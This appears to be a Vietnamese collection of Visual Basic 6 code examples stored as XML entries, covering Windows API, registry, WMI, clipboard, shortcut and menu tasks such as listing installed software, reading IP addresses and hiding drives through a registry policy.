Bạn có thể thay đổi mẫu tìm nầy theo objRegEx.Pattern. xin tham khảo bài:
Replace nhiều ký tự số trong chuỗi không dùng vòng lặp
http://caulacbovb.com/forum/viewtopic.php?f=27&amp;t=1980#p11911

ví dụ mẫu: "\b1....\b" có 4 đáp án

3- Module1 hổ trợ MsgBox của bất kỳ chuỗi tiếng Việt Unicode nào, bạn khỏi mất công gõ theo các kiểu định dạng khác rắc rối.
ví dụ có chuỗi: str$ = "Câu Lạc Bộ VB"
Bạn chỉ cần gọi:
Msg str là xong.

Download:


</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093123043144</MaVD>
    <NoiDung>Module

Declare Function FindExecutable Lib "shell32.dll" Alias "FindExecutableA" (ByVal lpFile As String, ByVal lpDirectory As String, ByVal lpResult As String) As Long
 
Declare Function GetTempFileName Lib "kernel32" Alias "GetTempFileNameA" (ByVal lpszPath As String, ByVal lpPrefixString As String, ByVal wUnique As Long, ByVal lpTempFileName As String) As Long
 
Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Trong Form cần 1 CommonDialog1, Text1, Command1, Label1
Label1 sẽ hiện đường dẫn của của chương trình sẽ mở file đã chọn trong CommonDialog... 

Private Sub Command1_Click()
On Error Resume Next
CommonDialog1.DialogTitle = "Chon file"
CommonDialog1.ShowOpen
If CommonDialog1.FileName &lt;&gt; "" Then
Text1.Text = CommonDialog1.FileName
End If
Dim FN, path As String
Dim i As Integer
For i = 1 To 10
FN = Right(Text1.Text, i)
If Left(FN, 1) = "." Then
path = Right(FN, i - 1)
Exit For
End If
Next
Label1.Caption = GetAssociatedProgram(path)
End Sub
Public Function GetAssociatedProgram(ByVal Extension As String) As String
    Dim path As String
    Dim FileName As String
    Dim nRet As Long
    Const MAX_PATH As Long = 260
    
    path = String$(MAX_PATH, 0)
    
    If GetTempPath(MAX_PATH, path) Then
        FileName = String$(MAX_PATH, 0)
        
        If GetTempFileName(path, "~", 0, FileName) Then
            FileName = Left$(FileName, InStr(FileName, vbNullChar) - 1)
            
            Name FileName As Left$(FileName, InStr(FileName, ".")) &amp; Extension
            FileName = Left$(FileName, InStr(FileName, ".")) &amp; Extension
            
            path = String$(MAX_PATH, 0)
            
            Call FindExecutable(FileName, vbNullString, path)
            GetAssociatedProgram = Left$(path, InStr(path, vbNullChar) - 1)
            
            Kill FileName
        End If
    End If
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093623043609</MaVD>
    <NoiDung>Private Sub Command1_Click() 'Gởi text vào Clipboard
Clipboard.Clear
Clipboard.SetText ("Nguyen Trung Tin")
End Sub
 
Private Sub Command2_Click() 'Gởi image vào Clipboard
Clipboard.Clear
Clipboard.SetData LoadPicture("E:\Life Sun.JPG")
'hoặc ClipBoard.Setdata Picture1.Picture
End Sub

Lưu ý: Khi Clipboard đang rỗng mà xài Clear thì sẽ báo lỗi. Cho nên phải bắt lỗi chỗ đó... </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093823043815</MaVD>
    <NoiDung>Private Declare Function URLDownloadToFile Lib "urlmon" _
   Alias "URLDownloadToFileA" _
  (ByVal pCaller As Long, _
   ByVal szURL As String, _
   ByVal szFileName As String, _
   ByVal dwReserved As Long, _
   ByVal lpfnCB As Long) As Long
Private Declare Function DeleteUrlCacheEntry Lib "Wininet.dll" _
   Alias "DeleteUrlCacheEntryA" _
  (ByVal lpszUrlName As String) As Long
 
Public Function GetPublicIP()
   Dim sSourceUrl As String 'chứa đường dẫn web có cơ chế lấy được IP thực của mình. Cái này bạn có thể test trên trình duyệt rồi bỏ vào
   'Tuy nhiên lưu ý cấu trúc của trang đó như thế nào. Cái link cài đặt bên dưới là mình dùng nguyên của source gốc. Cấu trúc rất đơn giản
    'để dễ xử lý khi lưu file về máy.
   Dim sLocalFile As String 'Tên file sẽ được lưu nội dung lấy về từ link trên
   Dim hfile As Long
   Dim buff As String
   Dim pos1 As Long
   Dim pos2 As Long
   sSourceUrl = "http://vbnet.mvps.org/resources/tools/getpublicip.shtml"
   sLocalFile = "c:\ip.txt"
   Call DeleteUrlCacheEntry(sSourceUrl) 'Xoa cache url nay neu da co ton tai (tranh tinh trang ip dong)
   If DownloadFile(sSourceUrl, sLocalFile) Then 'Lưu nội dung của Url trên về sLocalFile
     'Đoạn lệnh bên dưới sẽ xử lý nội dung sLocalFile lưu về, cái này theo format của trang chính dùng để getIP
      hfile = FreeFile
      Open sLocalFile For Input As #hfile
         buff = Input$(LOF(hfile), hfile)
      Close #hfile
      pos1 = InStr(buff, "var ip =")
      If pos1 Then
         pos1 = InStr(pos1 + 1, buff, "'", vbTextCompare) + 1
         pos2 = InStr(pos1 + 1, buff, "'", vbTextCompare) '- 1
         GetPublicIP = Mid$(buff, pos1, pos2 - pos1)
      Else
         GetPublicIP = "Chuong trinh khong the lay duoc dia chi IP WAN cua may ban"
      End If
      Kill sLocalFile 'Xóa file sau khi xử lý xong, nếu bạn muốn xem nội dung file thì hay bỏ qua câu lệnh này
   Else
      GetPublicIP = "Chuong trinh khong the lay duoc dia chi IP WAN cua may ban"
   End If
End Function
Private Function DownloadFile(ByVal sURL As String, _
                             ByVal sLocalFile As String) As Boolean
   
  DownloadFile = URLDownloadToFile(0, sURL, sLocalFile, 0, 0) = ERROR_SUCCESS
   
End Function
'Thêm một command để gọi thực thi
Private Sub Command1_Click()
   MsgBox GetPublicIP
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094023044027</MaVD>
    <NoiDung>For Each objFile In GetObject("winmgmts:").ExecQuery("Select * from CIM_DataFile Where Extension = 'txt'")
        i = i + 1
   a = a &amp; objFile.Name &amp; vbCr
Next
MsgBox i &amp; "Files TXT" &amp; vbCr &amp; a

Đương nhiên bạn có quyền thay đổi đuôi file theo yêu cầu riêng</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094223044240</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objWMIService = GetObject("winmgmts:\\" &amp; "." &amp; "\root\cimv2")
Set IPConfigSet = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=TRUE")
 
For Each IPConfig In IPConfigSet
    If Not IsNull(IPConfig.IPAddress) Then
        For i = LBound(IPConfig.IPAddress) To UBound(IPConfig.IPAddress)
            MsgBox "DefaultIPGateway: " &amp; IPConfig.DefaultIPGateway(i) &amp; vbCr &amp; "IPAdress: " &amp; IPConfig.IPAddress(i) &amp; vbCr &amp; "IPSubnet: " &amp; IPConfig.IPSubnet(i)
        Next
    End If
Next
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094423044402</MaVD>
    <NoiDung>Option Explicit
 
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function GetIpAddrTable Lib "IPHlpApi" (pIPAdrTable As Byte, pdwSize As Long, ByVal Sort As Long) As Long
 
Private Type IPINFO
    dwAddr As Long
    dwIndex As Long
    dwMask As Long
    dwBCastAddr As Long
    dwReasmSize As Long
    unused1 As Integer
    unused2 As Integer
End Type
 
Private Type MIB_IPADDRTABLE
    dEntrys As Long
    mIPInfo(255) As IPINFO
End Type
 
Private Type IP_Array
    mBuffer As MIB_IPADDRTABLE
    BufferLen As Long
End Type
 
Private Function ConvertAddressToString(longAddr As Long) As String
    Dim myByte(3) As Byte
    Dim Cnt As Long
    CopyMemory myByte(0), longAddr, 4
    For Cnt = 0 To 3
        ConvertAddressToString = ConvertAddressToString + CStr(myByte(Cnt)) &amp; "."
    Next Cnt
    ConvertAddressToString = left$(ConvertAddressToString, Len(ConvertAddressToString) - 1)
End Function
 
Private Function GETip() As String
On Error GoTo End1
    Dim Ret As Long
    Dim bBytes() As Byte
    Dim Listing As MIB_IPADDRTABLE
    
    GetIpAddrTable ByVal 0&amp;, Ret, True
    If Ret &lt;= 0 Then Exit Function
    ReDim bBytes(0 To Ret - 1) As Byte
    GetIpAddrTable bBytes(0), Ret, False
    CopyMemory Listing.dEntrys, bBytes(0), 4
    CopyMemory Listing.mIPInfo(0), bBytes(4), Len(Listing.mIPInfo(0))
    
    GETip = ConvertAddressToString(Listing.mIPInfo(0).dwAddr)
    Exit Function
End1:
    GETip = ""
End Function
 
Private Sub Form_Load()
    MsgBox "My IP:" &amp; GETip, vbOKOnly, "My IP"
    End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094623044646</MaVD>
    <NoiDung>Đây là một số mã để tạo registry key:

Public Sub CreateKey(ayun As String, Value As String)
Dim b As Object
On Error Resume Next
Set b = CreateObject("wscript.shell")
b.RegWrite ayun, Value
End Sub
 
Public Sub CreateIntegerKey(ayun As String, Value As Integer)
Dim b As Object
On Error Resume Next
Set b = CreateObject("wscript.shell")
b.RegWrite ayun, Value, "REG_DWORD"
 
End Sub
'Delete registry key
Public Sub DeleteKey(Value As String)
Dim b As Object
On Error Resume Next
Set b = CreateObject("Wscript.Shell")
b.RegDelete Value
End Sub

Sau đó dùng lệnh này để giấu ổ đĩa D:\

Private Sub Command1_Click()
CreateIntegerKey "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Nodrives", 8
End Sub

Logoff hoặc khởi động lại máy để xem kết quả.
Muốn giấu các ổ đĩa khác thay số 8 bằng:
C:4
D:8
E:16
F:32
C và D = 4+8=12
C và E =4+16=20
C và D và E =4+8+16=28
Đơn giản vậy thôi!

Làm hiện lại cũng như vậy nhưng thay số 8 bằng số 0 nhé. </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094923044932</MaVD>
    <NoiDung>Private Sub Form_Load()
Const DESKTOP = &amp;H10&amp;
Set objShell = CreateObject("Shell.Application").NameSpace(DESKTOP)
Set objFolder = objShell.ParseName("FreeCell (2).lnk") '&lt;-- tên shortcut
Set objShortcut = objFolder.GetLink
objShortcut.SetIconLocation "C:\Windows\System32\SHELL32.dll", 16
objShortcut.Save
End Sub

Thay đổi icon của shortcut mà, nên phải tạo một shortcut tên FreeCell (2) trên Desktop trước khi chạy đoạn code ở trên.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095023045051</MaVD>
    <NoiDung>Option Explicit
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Private Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hkey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hkey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Const REG_SZ = 1
Private Const HKEY_LOCAL_MACHINE = &amp;H80000002
' Khai bao cac ham va cac ham API dung cho viec xu ly Registry
Private Sub LoadProgram()
Dim retval&amp;, i&amp;, n&amp;, hkey&amp;, LeStr&amp;, LeCla
Dim Str$, Result$, Cla$
Dim a As FILETIME
i = 0
retval = RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", hkey)
Do While (0 = 0)
    Str = Space(255): Cla = Space(255)
    LeStr = 255: LeCla = 255
    retval = RegEnumKeyEx(hkey, i, ByVal Str, LeStr, ByVal 0, Cla, LeCla, a)
    If retval &lt;&gt; 0 Then RegCloseKey (hkey): Exit Sub
    i = i + 1
    Str = Left(Str, LeStr)
    Me.Print "Soft name : " &amp; LoadName(Str)
Loop
End Sub
Public Function LoadName(Key As String) As String
    Dim retval&amp;, le&amp;, hkey&amp;
    Dim st$
    retval = RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" &amp; Key, hkey)
    st = Space(255)
    le = 255
    retval = RegQueryValueEx(hkey, "DisplayName", 0&amp;, 1&amp;, ByVal st, le)
    LoadName = Left(st, le - 1)
    RegCloseKey (hkey)
End Function
Private Sub Form_Load()
Me.AutoRedraw = True
Me.Height = Screen.Height
Me.Width = Screen.Width \ 2
Me.Top = 0
Me.Left = Screen.Width \ 4
LoadProgram
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095223045227</MaVD>
    <NoiDung>1 command, 1 textbox

Private Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTtoalNumberOfClusters As Long) As Long
 
Private Type DiskInformation
    lpSectorsPerCluster As Long
    lpBytesPerSector As Long
    lpNumberOfFreeClusters As Long
    lpTotalNumberOfClusters As Long
End Type
 
Private Sub Command1_Click()
On Error Resume Next
Dim info As DiskInformation
Dim lAnswer As Long
Dim lpRootPathName As String
Dim lpSectorsPerCluster As Long
Dim lpBytesPerSector As Long
Dim lpNumberOfFreeClusters As Long
Dim lpTotalNumberOfClusters As Long
Dim lBytesPerCluster As Long
Dim lNumFreeBytes As Double
Dim sString As String
 
lpRootPathName = Text1.Text &amp; ":\"
lAnswer = GetDiskFreeSpace(lpRootPathName, lpSectorsPerCluster, lpBytesPerSector, lpNumberOfFreeClusters, lpTotalNumberOfClusters)
lBytesPerCluster = lpSectorsPerCluster * lpBytesPerSector
lNumFreeBytes = lBytesPerCluster * lpNumberOfFreeClusters
sString = "Free Disk Space (B) : " &amp; lNumFreeBytes &amp; " B" &amp; vbCr &amp; vbLf
sString = sString &amp; "Free Disk Space (Kb): " &amp; (lNumFreeBytes / 1024) &amp; " Kb" &amp; vbCr &amp; vbLf
sString = sString &amp; "Free Disk Space (Mb): " &amp; Format(((lNumFreeBytes / 1024) / 1024), "0.00") &amp; " Mb"
 
MsgBox sString
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095323045340</MaVD>
    <NoiDung>Private Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
 
Private Sub Command1_Click()
 
    If SetVolumeLabel("c:\", "MrTin") = 1 Then ’MrTin là tên muốn đổi
 
        MsgBox "Successful!!", , "Successful"
 
    Else
 
        MsgBox "An Error occured while trying to change drive label", bCritical, "Error"
 
    End If
 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095423045450</MaVD>
    <NoiDung>Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Const GW_CHILD = 5
Private Const LVA_ALIGNLEFT = &amp;H1
Private Const LVM_ARRANGE = &amp;H1016
 
Private Sub Command1_Click()
Dim hWnd1 As Long
Dim hWnd2 As Long
Dim Ret As Long
hWnd1 = FindWindow("Progman", vbNullString)
hWnd2 = GetWindow(hWnd1, GW_CHILD)
hWnd1 = GetWindow(hWnd2, GW_CHILD)
Ret = SendMessage(hWnd1, LVM_ARRANGE, LVA_ALIGNLEFT, 0)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095623045646</MaVD>
    <NoiDung>Private Type SHFILEOPSTRUCT
    hwnd As Long
    wFunc As Long
    pFrom As String
    pTo As String
    fFlags As Integer
    fAnyOperationsAborted As Long
    hNameMappings As Long
    lpszProgressTitle As Long
End Type
    Private Declare Function SHFileOperation Lib "shell32.dll" Alias "SHFileOperationA" (ByVal lpFileOp As SHFILEOPSTRUCT) As Long
    Private Const FO_DELETE = &amp;H3
    Private Const FOF_ALLOWUNDO = &amp;H40
 
 
    Dim typOperation As SHFILEOPSTRUCT
 
    With typOperation
        .wFunc = FO_DELETE
        .pFrom = "filename.txt"   'File to move to bin
        .fFlags = FOF_ALLOWUNDO
    End With
    SHFileOperation typOperation</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095823045818</MaVD>
    <NoiDung>Thêm vào Form 2 Command

Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
 
Private Sub Command1_Click()
'Tráo đổi button của chuột
SwapMouseButton 1
End Sub
 
Private Sub Command2_Click()
'Trả về bình thường
SwapMouseButton 0
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>095923045941</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objShell = CreateObject("Wscript.Shell")
strPrograms = objShell.SpecialFolders("Programs") 'Tìm Folder Programs
Set objShellLink = objShell.CreateShortcut(strPrograms &amp; "\" &amp; "C.lnk") '&lt;--Vi trí Shortcut
objShellLink.TargetPath = "C:\" ' Tao shortcut to C:  ví du nhu' thê
objShellLink.Description = "System Drive"
objShellLink.WorkingDirectory = "C:\"
objShellLink.Save
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090123050112</MaVD>
    <NoiDung>Private Sub Command1_Click()
On Error Resume Next
Dim KhoiTao, ThuMuc, DoiTuong
Set KhoiTao = CreateObject("Shell.Application")
Set ThuMuc = KhoiTao.Namespace(&amp;HB&amp;)
Set DoiTuong = ThuMuc.Self
 
Dim OnStartMenu As String
    OnStartMenu = "ControlPanel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
    MkDir DoiTuong.Path &amp; "\" &amp; OnStartMenu
End Sub

Các đối tượng khác có thể thêm... các bạn chỉ cần đổi biến OnStartMenu bằng những chuỗi dưới đây:

Administrator Tools.{D20EA4E1-3957-11d2-A40B-0C5020524153}
Briefcase.{85BBD92O-42A0-1O69-A2E4-08002B30309D} 
Fonts.{D20EA4E1-3957-11d2-A40B-0C5020524152}
History.{FF393560-C2A7-11CF-BFF4-444553540000} 
Inbox.{00020D75-0000-0000-C000-000000000046} 
Microsoft Network.{00028B00-0000-0000-C000-000000000046}
Network Computers.{1f4de370-d627-11d1-ba4f-00a0c91eedba}
Network Connections.{7007ACC7-3202-11D1-AAD2-00805FC1270E}
Printers and Faxes.{2227A280-3AEA-1069-A2DE-08002B30309D}
Programs Folder.{7be9d83c-a729-4d97-b5a7-1b7313c39e0a}
Scanners and Cameras.{E211B736-43FD-11D1-9EFB-0000F8757FCD}
Scheduled Task.{D6277990-4C6A-11CF-8D87-00AA0060F5BF}
Temporary Internet Files.{7BD29E00-76C1-11CF-9DD0-00A0C9034933}</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090223050226</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objWMIService = GetObject("winmgmts:\\" &amp; "." &amp; "\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * From Win32_DisplayConfiguration")
 
For Each objItem In colItems
    a = a &amp; "Name: " &amp; objItem.DeviceName &amp; vbCr
    a = a &amp; "Color depth: " &amp; objItem.BitsPerPel &amp; vbCr
    a = a &amp; "Horizontal resolution: " &amp; objItem.PelsWidth &amp; vbCr
    a = a &amp; "Vertical resolution: " &amp; objItem.PelsHeight &amp; vbCr
Next
MsgBox a
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090423050424</MaVD>
    <NoiDung>Private Sub Form_Load()
Set objShell = CreateObject("Shell.Application")
    ' Folder cân làm gì Ðó, vd E:\New Folder
Set objFolder = objShell.NameSpace("E:\New Folder")
Set colItems = objFolder.Items
For Each objItem In colItems
    ' Làm gì Ðây? Open, Print, Edit, Cut, Copy, Delete
    objItem.InvokeVerbEx ("Open")
Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090923050912</MaVD>
    <NoiDung>Cho một form, thêm một list tên list1 vào rồi thêm đoạn code này vào:

Private Sub Form_Load()
Dim SoItem As String
Dim i As Integer
SoItem = GetSetting("T7 's Code", "Examble", "ItemCount", 0)
If SoItem &gt; 0 Then
    List1.Clear
    For i = 1 To SoItem
        List1.AddItem GetSetting("T7 's code", "Examble", "Item " &amp; i, "")
    Next i
End If
End Sub
 
Private Sub Form_Unload(Cancel As Integer)
SaveSetting "T7 's Code", "Examble", "ItemCount", List1.ListCount
For i = 1 To List1.ListCount
    SaveSetting "T7 's code", "Examble", "Item " &amp; i, List1.List(i - 1)
Next
End Sub

Bây giờ bạn có thể thiết kế thêm các tính năng khác cho chương trình như chức năng add thêm dữ liệu vào list lúc đang chạy hay xóa bớt đi..., sau đó hãy thử tắc và mở lên lại xem, các dữ liệu trên list vẫn còn được lưu một cách nguyên vẹn
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091023051055</MaVD>
    <NoiDung>Module

Option Explicit
 
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
 
Private Const GWL_WNDPROC = -4
Private lpPrevWndProc As Long
Private IsHooked As Boolean
Public gHW As Long
 
Public Sub Hook()
    If IsHooked Then
        MsgBox "Hook"
    Else
        lpPrevWndProc = SetWindowLong(gHW, GWL_WNDPROC, _
        AddressOf WindowProc)
        IsHooked = True
    End If
End Sub
 
Public Sub Unhook()
    Dim temp As Long
    
    If IsHooked Then
        temp = SetWindowLong(gHW, GWL_WNDPROC, lpPrevWndProc)
        IsHooked = False
    End If
End Sub
 
Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long    
    Const WM_CTLCOLORSCROLLBAR = &amp;H137
    If WM_CTLCOLORSCROLLBAR = uMsg Then
        Debug.Print "Message: "; hw, uMsg, wParam, lParam
    Else
        WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
    End If
End Function

Add vào Form 1 HScroll hay 1 VScroll cũng được


Private Sub Form_Load()
    gHW = Me.hwnd
    Hook
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    Unhook    
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091323051341</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>091923051933</MaVD>
    <NoiDung>Chỉ cần List1 và code sau:

Option Explicit
  Private Const LB_SETTABSTOPS As Long = &amp;H192&amp;
  Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
  (ByVal hWnd&amp;, ByVal wMsg&amp;, ByVal wParam&amp;, lParam As Any) As Long
 
Private Sub Form_Load()
  ReDim TabStops(1) As Long
 
  TabStops(0) = 32
  TabStops(1) = 113
 
  Call SendMessage(List1.hWnd, LB_SETTABSTOPS, 2&amp;, TabStops(0))
  
  Dim i&amp;, Ngày As Date: Ngày = #5/8/1990#
  List1.AddItem "STT" &amp; vbTab &amp; "Ho và Tên" &amp; vbTab &amp; "Ngày Sinh"
  For i = 2 To 31
    List1.AddItem i - 1 &amp; vbTab &amp; "Hoc Sinh " &amp; CStr(i - 1) &amp; _
    vbTab &amp; Ngày
    Ngày = Ngày + 17
  Next
 
End Sub

Để minh họa bài viết trên rõ ràng hơn: tôi dùng ADODB để truy xuất dữ liệu file text, cho hiện ta list1
(Ghi chú: file text không dùng Unicode)

Private Const LB_SETTABSTOPS As Long = &amp;H192&amp;
  Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
  (ByVal hWnd&amp;, ByVal wMsg&amp;, ByVal wParam&amp;, lParam As Any) As Long
Private Sub Form_Load()
Dim Cn As New ADODB.Connection
Dim Rs As New ADODB.Recordset
Cn.Open "Provider=Microsoft.Jet.OLEDB.4.0;" &amp; _
          "Data Source=" &amp; App.Path &amp; "\" &amp; _
          ";Extended Properties=""text;HDR=YES;FMT=Delimited"""
 
Rs.Open "SELECT * FROM Danhsách.txt", _
          Cn, adOpenStatic, adLockOptimistic, adCmdText
 
  ReDim TabStops(1) As Long
 
  TabStops(0) = 32
  TabStops(1) = 113
 
  Call SendMessage(List1.hWnd, LB_SETTABSTOPS, 2&amp;, TabStops(0))
 
  List1.AddItem "STT" &amp; vbTab &amp; "Ho và Tên" &amp; vbTab &amp; "Ngày Sinh"
    Do While Not Rs.EOF
        List1.AddItem Rs!STT &amp; vbTab &amp; Rs!HovàTên &amp; vbTab &amp; Rs!NgàySinh
        Rs.MoveNext
    Loop
 
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092123052124</MaVD>
    <NoiDung>'cần 1 timer
Option Explicit
 
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
'Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
 
Const ShiftKey As Long = 16
Const CtrlKey  As Long = 17
Const AltKey   As Long = 18
 
Private Sub Form_Load()
    Timer1.Interval = 1
    Me.Hide
End Sub
 
Private Sub Timer1_Timer()
    'Ctrl + Shift + S
    If GetAsyncKeyState(CtrlKey) And GetAsyncKeyState(ShiftKey) And GetAsyncKeyState(vbKeyS) Then Me.Show
    'Ctrl + Shift + H
    If GetAsyncKeyState(CtrlKey) And GetAsyncKeyState(ShiftKey) And GetAsyncKeyState(vbKeyH) Then Me.Hide
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092523052526</MaVD>
    <NoiDung>Form1 cần 1 menu, 1 TextBox

Private Declare Function LockWindowUpdate Lib "user32" (ByVal hwndLock As Long) As Long
Function TextBoxRightClickMenu(Button As Integer, txtControl As TextBox, oPopMenu As Object) As Boolean
    On Error GoTo ErrFailed
    If Button = vbRightButton Then
        LockWindowUpdate txtControl.hwnd
        txtControl.Enabled = False
        PopupMenu oPopMenu
        txtControl.Enabled = True
        LockWindowUpdate 0&amp;
        TextBoxRightClickMenu = True
    End If
    Exit Function
ErrFailed:
    Debug.Print "Error in TextBoxRightClickMenu: " &amp; Err.Description
    TextBoxRightClickMenu = False
End Function
 
Private Sub Text1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    TextBoxRightClickMenu Button, Text1, m1
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092723052728</MaVD>
    <NoiDung>Option Explicit
  ' demo project showing how to manipulate VB menus using the API
  ' by Bryan Stafford of New Vision Software® - newvision@mvps.org
  ' this demo is released into the public domain "as is" without
  ' warranty or guaranty of any kind.  In other words, use at
  ' your own risk.
 
  ' API calls used
  Private Declare Function GetMenu&amp; Lib "user32" (ByVal hwnd&amp;)
  Private Declare Function GetSubMenu&amp; Lib "user32" (ByVal hMenu&amp;, ByVal nPos&amp;)
  Private Declare Function GetMenuItemID&amp; Lib "user32" (ByVal hMenu&amp;, ByVal nPos&amp;)
  Private Declare Function ModifyMenu&amp; Lib "user32" Alias "ModifyMenuA" (ByVal hMenu&amp;, _
                          ByVal nPosition&amp;, ByVal wFlags&amp;, ByVal wIDNewItem&amp;, ByVal lpString$)
  Private Declare Function GetSystemMetrics&amp; Lib "user32" (ByVal nIndex&amp;)
 
Private Sub Form_Load()
 
  ' It seems that there is a limit to the number of menus that may be added
  ' in any VB application.  I discovered this by setting the number of menus
  ' in each menu array ever higher until I received an 'Out of Memory' error.
  ' The error occurred at 337 items between all three menu arrays.  This does
  ' not take into account the other higher level menus in the application.
  
  ' position the form
  Move (Screen.Width \ 2) - (Width \ 2), 0
 
  Form_Paint ' Autoredraw is set to true so we need to call the form paint to draw the form text
 
  Const MF_BYPOSITION As Long = &amp;H400&amp;   '&lt;--** tells modifymenu to act on the menu at the specified position
  Const MF_MENUBARBREAK As Long = &amp;H20&amp;  '&lt;--** tells modifymenu to add another column with a vertical separator
  Const MF_MENUBREAK As Long = &amp;H40&amp;     '&lt;--** tells modifymenu to add another column without a vertical separator
  Const SM_CYFULLSCREEN As Long = 17&amp;    '&lt;--** height of client area of a maximized window
  Const SM_CYMENU  As Long = 15&amp;         '&lt;--** height of menu
 
  Dim menuheight&amp;, breakpoint&amp;, menuhWnd&amp;, submenuhWnd&amp;, nextsubmenuhWnd&amp;
  Dim i&amp;, loopnum&amp;, loopstr$, msg$
 
  ' get the client area height and divide it by the height of a menu
  ' to get the point where we need to *wrap* the menu to a new column
  menuheight = GetSystemMetrics(SM_CYMENU)
  breakpoint = (GetSystemMetrics(SM_CYFULLSCREEN) - menuheight) \ menuheight
 
  menuhWnd = GetMenu(hwnd) ' get the handle of the menu for *this* form
 
  submenuhWnd = GetSubMenu(menuhWnd, 0) ' get the handle of the first sub menu
 
  For i = 1 To 99  ' load the first menu array (rember, zero is already loaded)
    On Error GoTo TooManyMenus
    Load mnuList1(i)
    On Error GoTo 0
    mnuList1(i).Caption = "Menu Item " &amp; CStr(i + 1)
 
                     ' if we've reached the breakpoint then add a new column with
    If i Mod breakpoint = 0 Then   ' a vertical bar the proper ID must be specified
 
      Call ModifyMenu(submenuhWnd, i, MF_BYPOSITION Or MF_MENUBARBREAK, _
                              GetMenuItemID(submenuhWnd, i), "Menu Item " &amp; CStr(i + 1))
    End If
  Next
                    
                    ' get the handle of the popup menu that is in the position
  submenuhWnd = GetSubMenu(submenuhWnd, i) ' at AFTER the menus we just loaded
 
  For i = 1 To 9  ' load the popup sub menu array of the first menu array (rember, zero is already loaded)
    On Error GoTo TooManyMenus
    Load mnuList4(i)
    On Error GoTo 0
